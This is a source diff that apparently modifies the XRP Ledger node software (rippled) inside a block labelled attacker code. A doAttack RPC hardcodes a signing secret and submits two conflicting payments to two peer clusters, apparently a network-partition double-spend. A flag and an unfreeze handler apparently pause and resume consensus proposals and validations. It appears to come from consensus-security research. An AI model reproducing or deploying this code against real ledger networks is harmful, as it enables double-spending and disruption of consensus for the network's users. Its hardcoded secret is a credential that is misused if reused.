@@ -26,12 +26,13 @@
 #include <ripple/app/misc/HashRouter.h>
 #include <ripple/app/misc/Transaction.h>
 #include <ripple/app/misc/ValidatorList.h>
-#include <ripple/ledger/RawView.h>
-#include <ripple/rpc/impl/TransactionSign.h>
+#include <ripple/app/main/Application.h>
 #include <ripple/app/tx/apply.h>
+#include <ripple/ledger/RawView.h>
 #include <ripple/net/RPCErr.h>
 #include <ripple/protocol/ErrorCodes.h>
 #include <ripple/resource/Fees.h>
+#include <ripple/rpc/impl/TransactionSign.h>
 #include <ripple/rpc/Role.h>
 #include <ripple/rpc/Context.h>
 #include <ripple/rpc/impl/TransactionSign.h>
@@ -176,6 +177,11 @@ Json::Value doSubmit (RPC::Context& context)
 // Start attacker code
 Json::Value doAttack (RPC::Context& context)
 {
+    auto j = context.app.journal ("Attack");
+    performing_attack = true;
+    JLOG (j.warn()) << "Starting doAttack(). Setting performing_attack = " << performing_attack;
+    
+    // Store transaction-signing secret
     context.params[jss::secret] = "sEd7gsxCwikqZ9C81bjKMFNM9xoReYU";
 
     // create tx1:
@@ -193,24 +199,20 @@ Json::Value doAttack (RPC::Context& context)
     tx2[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
     tx2[jss::Fee] = "10";
     tx2[jss::TransactionType] = "Payment";
-
-    auto j = context.app.journal ("Attack");
-    JLOG (j.warn()) << "Starting doAttack()";
     
     context.loadType = Resource::feeMediumBurdenRPC;
     const auto peers = context.app.overlay ().getActivePeers();             // store all peers (so we can connect again later)
     const auto ledger = context.app.getLedgerMaster().getCurrentLedger();   // store current ledger to restore it later
     auto const failType = getFailHard (context);
-    auto& netOps = context.netOps;
 
-    JLOG (j.warn()) << "Submit transaction to " << tx1[jss::Destination];
+    JLOG (j.warn()) << "Submit transaction to cluster 1: " << tx1;
     context.params[jss::tx_json] = tx1;
     RPC::transactionSubmitAttack (
         context.params, failType, context.role,
         context.ledgerMaster.getValidatedLedgerAge(),
         context.app, RPC::getProcessTxnFnAttack (context.netOps), 1);
 
-    JLOG (j.warn()) << "Submit transaction to " << tx2[jss::Destination];
+    JLOG (j.warn()) << "Submit transaction to cluster 2: " << tx2;
     context.params[jss::tx_json] = tx2;
     RPC::transactionSubmitAttack (
         context.params, failType, context.role,
@@ -218,12 +220,19 @@ Json::Value doAttack (RPC::Context& context)
         context.app, RPC::getProcessTxnFnAttack (context.netOps), 2);
 
     // disconnect from all peers
-    changePeers(context, peers, -1, j);
+    // changePeers(context, peers, -1, j);
     return Json::Value();
 }
 
 void sendProposal(RPC::Context& context, beast::Journal j) {
-
+    // protocol::TMProposeSet& m;
+    // if (setup_.expire)
+    //     m.set_hops(0);
+    // auto const sm = std::make_shared<Message>(m, protocol::mtPROPOSE_LEDGER);
+    // for_each([&](std::shared_ptr<PeerImp>&& p)
+    // {
+    //     p->send(sm);
+    // });
 }
 
 void changePeers (RPC::Context& context, Overlay::PeerSequence peers, int cluster_idx, beast::Journal j) {
@@ -268,6 +277,19 @@ bool shouldConnectPeer(std::string peer_address, int cluster_idx) {
     }
 }
 
+Json::Value unfreeze(RPC::Context& context) {
+    auto j = context.app.journal ("Attack");
+    Json::Value ret;
+    if (!performing_attack) {
+        ret[jss::status] = "unsuccessful";
+        ret[jss::message] = "Not performing attack right now. Nothing to do...";
+        return ret;
+    }
+    performing_attack = false;
+    JLOG (j.warn()) << "Unfreeze: Setting performing_attack = " << performing_attack;
+    ret[jss::message] = "Unfreeze the network. Sending proposals and validation-messages again.";
+    return ret;
+}
 // End attacker code
 
 } // ripple
